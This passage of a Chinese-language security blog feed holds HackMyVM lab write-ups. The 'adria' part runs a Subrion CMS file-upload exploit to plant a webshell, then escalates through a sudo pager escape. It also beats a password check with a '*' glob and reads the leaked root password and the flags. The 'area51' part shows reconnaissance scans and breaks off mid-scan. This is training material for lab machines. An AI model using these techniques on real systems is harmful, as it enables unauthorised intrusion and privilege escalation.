</span></span><span style="display:flex;"><span>------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
</span></span><span style="display:flex;"><span>Subrion 4.2.1 - <span style="color:#e6db74">&#39;Email&#39;</span> Persistant Cross-Site Scripting                                                                                         | php/webapps/47469.txt
</span></span><span style="display:flex;"><span>Subrion CMS 4.2.1 - <span style="color:#e6db74">&#39;avatar[path]&#39;</span> XSS                                                                                                          | php/webapps/49346.txt
</span></span><span style="display:flex;"><span>Subrion CMS 4.2.1 - Arbitrary File Upload                                                                                                       | php/webapps/49876.py
</span></span><span style="display:flex;"><span>Subrion CMS 4.2.1 - Cross Site Request Forgery <span style="color:#f92672">(</span>CSRF<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Add Amin<span style="color:#f92672">)</span>                                                                                | php/webapps/50737.txt
</span></span><span style="display:flex;"><span>Subrion CMS 4.2.1 - Cross-Site Scripting                                                                                                        | php/webapps/45150.txt
</span></span><span style="display:flex;"><span>Subrion CMS 4.2.1 - Stored Cross-Site Scripting <span style="color:#f92672">(</span>XSS<span style="color:#f92672">)</span>                                                                                           | php/webapps/51110.txt
</span></span><span style="display:flex;"><span>------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
</span></span><span style="display:flex;"><span>Shellcodes: No Results
</span></span></code></pre></div><h2 id="文件上传利用">文件上传利用</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@parrot:~/workspace/tmp
</span></span><span style="display:flex;"><span> $ python 49876.py -u <span style="color:#e6db74">&#34;http://192.168.22.102/panel/&#34;</span> -l admin -p jojo1989
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Trying to connect to: http://192.168.22.102/panel/
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Success!
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Got CSRF token: 3TOHhuzjpGzSVcG91hjvRjDCyS3Lknl3j71aWIyg
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Trying to log in...
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Login Successful!
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Generating random name <span style="color:#66d9ef">for</span> Webshell...
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Generated webshell title: qkjnzjgasjxszta
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Trying to Upload Webshell..
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Upload Success... Webshell path: http://192.168.22.102/panel/uploads/qkjnzjgasjxszta.phar
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ whoami
</span></span><span style="display:flex;"><span>www-data
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>www-data@adria:/var/www/html/uploads$ sudo -l
</span></span><span style="display:flex;"><span>sudo -l
</span></span><span style="display:flex;"><span>sudo: unable to resolve host adria: Name or service not known
</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> www-data on adria:
</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,
</span></span><span style="display:flex;"><span>    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin,
</span></span><span style="display:flex;"><span>    use_pty
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User www-data may run the following commands on adria:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>adriana<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/scalar
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sudo -u adriana 
</span></span></code></pre></div><h2 id="横向移动2adriana">横向移动2adriana</h2>
<h3 id="利用命令的帮助页面类more">利用命令的帮助页面,类more</h3>
<p>神奇,原来是这样子利用的,help页面是类似more的样子,可以直接!/bin/bash
下面图里是错的,不用:,直接!bash

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMV_adria_image_1.png" alt="HMV_adria_image_1" /><figcaption>HMV_adria_image_1</figcaption></figure>


</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cat user.txt
</span></span><span style="display:flex;"><span>fbd401c3bff5ec92d1ba6f74a2340f0f
</span></span></code></pre></div><h2 id="枚举">枚举</h2>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMV_adria_image_2.png" alt="HMV_adria_image_2" /><figcaption>HMV_adria_image_2</figcaption></figure>


</p>
<p>这个脚本一眼看出来能用*来绕过</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>adriana@adria:/opt$ ls -al
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">12</span>
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Jan <span style="color:#ae81ff">22</span> 18:20 .
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">18</span> root root <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2023</span> ..
</span></span><span style="display:flex;"><span>-rwxr-xr-x  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">294</span> Nov  <span style="color:#ae81ff">6</span>  <span style="color:#ae81ff">2023</span> backup
</span></span><span style="display:flex;"><span>adriana@adria:/opt$ cd backup 
</span></span><span style="display:flex;"><span>bash: cd: backup: Not a directory
</span></span><span style="display:flex;"><span>adriana@adria:/opt$ cat backup 
</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PASSWORD<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>/usr/bin/cat /root/pass<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>read -ep <span style="color:#e6db74">&#34;Password: &#34;</span> USER_PASS
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> $PASSWORD <span style="color:#f92672">==</span> $USER_PASS <span style="color:#f92672">]]</span> ; <span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  /usr/bin/echo <span style="color:#e6db74">&#34;Authorized access&#34;</span>
</span></span><span style="display:flex;"><span>  /usr/bin/sleep <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>  /usr/bin/zip -r -e -P <span style="color:#e6db74">&#34;</span>$PASSWORD<span style="color:#e6db74">&#34;</span> /opt/backup.zip /var/www/html
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>  /usr/bin/echo <span style="color:#e6db74">&#34;Access denied&#34;</span>
</span></span><span style="display:flex;"><span>  exit <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
</span></span><span style="display:flex;"><span>adriana@adria:/opt$
</span></span></code></pre></div><p>找到这个脚本,关键点肯定就在这了,但是我执行不了这个脚本</p>
<h2 id="使用ssh获得正常的shell">使用ssh获得正常的shell</h2>
<p>看了wp,原来是需要ssh上去,那个终端的环境太差了,sudo -l执行不出来
重新ssh之后,发现是能够sudo -l了</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>l1uyun in ~/workspace/tmp λ ssh -i id_rsa adriana@192.168.22.102
</span></span><span style="display:flex;"><span>The authenticity of host <span style="color:#e6db74">&#39;192.168.22.102 (192.168.22.102)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ED25519 key fingerprint is SHA256:TCA/ssXFaEc0sOJl0lvYyqTVTrCpkF0wQfyj5mJsALc.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">This host key is known by the following other names/addresses:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ~/.ssh/known_hosts:23: [hashed name]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    ~/.ssh/known_hosts:39: [hashed name]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Warning: Permanently added &#39;</span>192.168.22.102<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span> to the list of known hosts.
</span></span><span style="display:flex;"><span>Linux adria 6.1.0-10-amd64 <span style="color:#75715e">#1 SMP PREEMPT_DYNAMIC Debian 6.1.37-1 (2023-07-03) x86_64</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>The programs included with the Debian GNU/Linux system are free software;
</span></span><span style="display:flex;"><span>the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span></span><span style="display:flex;"><span>permitted by applicable law.
</span></span><span style="display:flex;"><span>Last login: Mon Jan <span style="color:#ae81ff">22</span> 18:16:06 <span style="color:#ae81ff">2024</span> from 192.168.0.30
</span></span><span style="display:flex;"><span>╭─adriana@adria ~ 
</span></span><span style="display:flex;"><span>╰─$ sudo -l
</span></span><span style="display:flex;"><span>sudo: unable to resolve host adria: Name or service not known
</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> adriana on adria:
</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin, use_pty
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User adriana may run the following commands on adria:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>ALL : ALL<span style="color:#f92672">)</span> NOPASSWD: /opt/backup
</span></span><span style="display:flex;"><span>╭─adriana@adria ~ 
</span></span><span style="display:flex;"><span>╰─$
</span></span></code></pre></div><h2 id="sudo-optbackup">sudo /opt/backup</h2>
<p>在www-date的窗口开一个pspy64,然后adriana的窗口sudo /opt/backup
输入*号来绕过这个bash的==符号</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span> /usr/bin/zip -r -e -P 8eNctPoCh4Potes5eVD7eMxUw6wRBmO /opt/backup.zip /var/www/html 
</span></span></code></pre></div><p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMV_adria_image_3.png" alt="HMV_adria_image_3" /><figcaption>HMV_adria_image_3</figcaption></figure>


</p>
<h2 id="root">root</h2>
<p>使用root密码,ssh连接一下

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMV_adria_image_4.png" alt="HMV_adria_image_4" /><figcaption>HMV_adria_image_4</figcaption></figure>


</p>
<pre tabindex="0"><code>╭─root@adria ~ 
╰─# cat root.txt 
3a61b172fd39402aa96b1653a18e38a1
╭─root@adria ~ 
╰─#
</code></pre>]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://l1uyun.one/tags/sec/hackmyvm" term="sec/hackmyvm" label="sec/hackmyvm" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[area51]]></title><link href="https://l1uyun.one/posts/hmv_area51/" rel="alternate" type="text/html" />
            <id>https://l1uyun.one/posts/hmv_area51/</id>
            
            <published>2024-04-16T19:27:27+08:00</published>
            <updated>2024-11-24T19:25:01+08:00</updated>
            
            
            <content type="html"><![CDATA[<h2 id="主机发现">主机发现</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~/workspace sudo arp-scan -I ens33 -l
</span></span><span style="display:flex;"><span>Interface: ens33, type: EN10MB, MAC: 00:0c:29:a1:f0:49, IPv4: 192.168.89.15
</span></span><span style="display:flex;"><span>Starting arp-scan 1.10.0 with <span style="color:#ae81ff">256</span> hosts <span style="color:#f92672">(</span>https://github.com/royhills/arp-scan<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>192.168.89.13   08:00:27:96:66:e2       PCS Systemtechnik GmbH
</span></span><span style="display:flex;"><span>192.168.89.99   f6:39:4a:3d:95:18       <span style="color:#f92672">(</span>Unknown: locally administered<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>192.168.89.247  ca:a7:78:4d:50:e1       <span style="color:#f92672">(</span>Unknown: locally administered<span style="color:#f92672">)</span>
</span></span></code></pre></div><h2 id="端口扫描">端口扫描</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~/workspace sudo nmap 192.168.89.13 -Pn -sT -p- -A --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">10000</span>
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-04-16 07:34 EDT
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.89.13
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.0025s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65532</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT     STATE SERVICE     VERSION
</span></span><span style="display:flex;"><span>22/tcp   open  ssh         OpenSSH 8.4p1 Debian <span style="color:#ae81ff">5</span> <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey:
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> de:bf:2a:93:86:b8:b3:a3:13:5b:46:66:34:d6:dc:b1 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> a9:df:bb:71:90:6c:d1:2f:e7:48:97:2e:ad:7b:15:d3 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 78:75:83:1c:03:03:a1:92:4f:73:8e:f2:2d:23:d2:0e <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp   open  http        Apache httpd 2.4.51 <span style="color:#f92672">((</span>Debian<span style="color:#f92672">))</span>
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.51 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: FBI Access
</span></span><span style="display:flex;"><span>8080/tcp open  nagios-nsca Nagios NSCA
</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>application/json<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>MAC Address: 08:00:27:96:66:E2 <span style="color:#f92672">(</span>Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Device type: general purpose
</span></span><span style="display:flex;"><span>Running: Linux 4.X|5.X
</span></span><span style="display:flex;"><span>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
</span></span><span style="display:flex;"><span>OS details: Linux 4.15 - 5.8
</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">1</span> hop
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>TRACEROUTE
</span></span><span style="display:flex;"><span>HOP RTT     ADDRESS
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>   2.52 ms 192.168.89.13
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 11.70 seconds
</span></span></code></pre></div><h2 id="web_80">web_80</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~/workspace whatweb 192.168.89.13
</span></span><span style="display:flex;"><span>http://192.168.89.13 <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Apache<span style="color:#f92672">[</span>2.4.51<span style="color:#f92672">]</span>, Bootstrap, Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTML5, HTTPServer<span style="color:#f92672">[</span>Debian Linux<span style="color:#f92672">][</span>Apache/2.4.51 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)]</span>, IP<span style="color:#f92672">[</span>192.168.89.13<span style="color:#f92672">]</span>, JQuery<span style="color:#f92672">[</span>2.1.3<span style="color:#f92672">]</span>, PasswordField, Script, Title<span style="color:#f92672">[</span>FBI Access<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>~/workspace whatweb 192.168.89.13:8080
</span></span><span style="display:flex;"><span>http://192.168.89.13:8080 <span style="color:#f92672">[</span><span style="color:#ae81ff">400</span> Bad Request<span style="color:#f92672">]</span> Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, IP<span style="color:#f92672">[</span>192.168.89.13<span style="color:#f92672">]</span>
</span></span></code></pre></div><p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMV_area51_image_1.png" alt="HMV_area51_image_1" /><figcaption>HMV_area51_image_1</figcaption></figure>


</p>
<p>进去是个登录窗口, 随便输入个凭据, 点击登录. 没有数据包发出去

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMV_area51_image_2.png" alt="HMV_area51_image_2" /><figcaption>HMV_area51_image_2</figcaption></figure>



就是个js</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>var working <span style="color:#f92672">=</span> false;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">$(</span><span style="color:#e6db74">&#39;.login&#39;</span><span style="color:#66d9ef">)</span>.on<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;submit&#39;</span>, <span style="color:#66d9ef">function</span><span style="color:#f92672">(</span>e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>  e.preventDefault<span style="color:#f92672">()</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>working<span style="color:#f92672">)</span> <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>  working <span style="color:#f92672">=</span> true;
</span></span><span style="display:flex;"><span>  var $this <span style="color:#f92672">=</span> <span style="color:#66d9ef">$(</span>this<span style="color:#66d9ef">)</span>,
</span></span><span style="display:flex;"><span>    $state <span style="color:#f92672">=</span> $this.find<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;button &gt; .state&#39;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>  $this.addClass<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;loading&#39;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>  $state.html<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Authenticating&#39;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>  setTimeout<span style="color:#f92672">(</span><span style="color:#66d9ef">function</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    $this.addClass<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;ok&#39;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>    $state.html<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Not authorized. The access attempt will be reported.&#39;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>    setTimeout<span style="color:#f92672">(</span><span style="color:#66d9ef">function</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>      $state.html<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Log in&#39;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>      $this.removeClass<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;ok loading&#39;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>      working <span style="color:#f92672">=</span> false;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>, 4000<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>, 3000<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">})</span>;
</span></span></code></pre></div><p>扫一下</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>☁  workspace  sudo gobuster dir  -u <span style="color:#e6db74">&#39;http://192.168.89.13/&#39;</span> -w ./directory-list-2.3-medium.txt -r -t <span style="color:#ae81ff">50</span>  -x txt,js,html,php  2&gt;/dev/null
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>Gobuster v3.6
</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://192.168.89.13/
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">50</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                ./directory-list-2.3-medium.txt
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.6
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Extensions:              txt,js,html,php
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Follow Redirect:         true
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>Starting gobuster in directory enumeration mode
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>/index.html           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 1131<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/.html                <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 278<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/.php                 <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 278<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/video                <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 4655<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/script.js            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 525<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/radar                <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 730<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>/note.txt             <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 119<span style="color:#f92672">]</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>~/workspace curl 192.168.89.13/note.txt
</span></span><span style="display:flex;"><span>Alert!
</span></span><span style="display:flex;"><span>We have a vulnerability in our java application...
</span></span><span style="display:flex;"><span>Notify the programming department to check Log4J.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>-Admin#
</span></span><span style="display:flex;"><span>~/workspace
</span></span></code></pre></div><p>说有一个java Application的话, 换个端口吧</p>
<h2 id="web_8080">web_8080</h2>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMV_area51_image_3.png" alt="HMV_area51_image_3" /><figcaption>HMV_area51_image_3</figcaption></figure>


</p>
<p>
<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMV_area51_image_4.png" alt="HMV_area51_image_4" /><figcaption>HMV_area51_image_4</figcaption></figure>


</p>
<p>继续扫一下
没出来有价值的东西

<figure class="md-figure">
  <img loading="lazy" decoding="async" src="https://img.l1uyun.one/HMV_area51_image_5.png" alt="HMV_area51_image_5" /><figcaption>HMV_area51_image_5</figcaption></figure>


</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>☁  workspace  nikto -url http://192.168.89.13:8080
</span></span><span style="display:flex;"><span>- Nikto v2.5.0
</span></span><span style="display:flex;"><span>---------------------------------------------------------------------------
</span></span><span style="display:flex;"><span>+ Target IP:          192.168.89.13
</span></span><span style="display:flex;"><span>+ Target Hostname:    192.168.89.13
</span></span><span style="display:flex;"><span>+ Target Port:        <span style="color:#ae81ff">8080</span>
</span></span><span style="display:flex;"><span>+ Start Time:         2024-04-16 19:49:52 <span style="color:#f92672">(</span>GMT8<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>---------------------------------------------------------------------------
</span></span><span style="display:flex;"><span>+ Server: No banner retrieved
</span></span><span style="display:flex;"><span>+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
</span></span><span style="display:flex;"><span>+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
</span></span><span style="display:flex;"><span>+ /AZDAS9pJ.prf: Uncommon header <span style="color:#e6db74">&#39;content-disposition&#39;</span> found, with contents: inline;filename<span style="color:#f92672">=</span>f.txt.
</span></span><span style="display:flex;"><span>+ No CGI Directories found <span style="color:#f92672">(</span>use <span style="color:#e6db74">&#39;-C all&#39;</span> to force check all possible dirs<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS .
